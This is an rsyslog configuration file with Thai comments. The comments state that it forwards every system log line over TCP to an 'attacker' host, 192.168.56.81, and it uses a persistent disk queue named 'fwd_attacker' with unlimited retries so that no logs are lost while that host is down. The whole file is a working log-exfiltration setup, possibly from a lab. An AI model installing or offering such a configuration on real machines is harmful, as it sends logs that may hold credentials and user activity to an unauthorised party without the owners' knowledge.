# /etc/rsyslog.d/90-remote.conf  ส่ง log ทุกบรรทัดไปเก็บที่ attacker ทาง TCP
# queue บนดิสก์เก็บ log ไว้ระหว่างที่ปลายทางล่ม แล้วส่งตามไปเมื่อกลับมา
action(type="omfwd" target="192.168.56.81" port="514" protocol="tcp" queue.type="LinkedList" queue.filename="fwd_attacker" queue.maxDiskSpace="200m" queue.saveOnShutdown="on" action.resumeRetryCount="-1")
